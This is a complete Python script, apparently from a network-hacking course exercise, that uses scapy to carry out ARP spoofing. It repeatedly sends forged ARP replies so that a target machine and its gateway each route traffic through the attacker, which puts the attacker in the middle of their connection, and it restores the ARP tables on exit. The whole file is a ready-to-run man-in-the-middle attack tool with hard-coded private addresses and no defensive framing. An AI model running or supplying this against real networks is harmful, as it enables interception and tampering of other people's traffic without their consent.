#!/usr/bin/env python
# This works only with Python 3, instructions on how
# to make it Python 2 compatible is provided in line 38.

import time
import scapy.all as scapy
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    # Make the target computer believe that you're the router
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet , count = 4, verbose = False)

target_ip = "192.168.18.140"
gateway_ip = "192.168.18.2"

sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        # You can use   ..._packets_count)),
        #               sys.stdout.flush()
        # To make this python2 compatible.

        print("\r[+] Sent 2 packets, total packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] CTRL + C is detected, resetting ARP tables.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

# print(packet.show())
# print(packet.summary())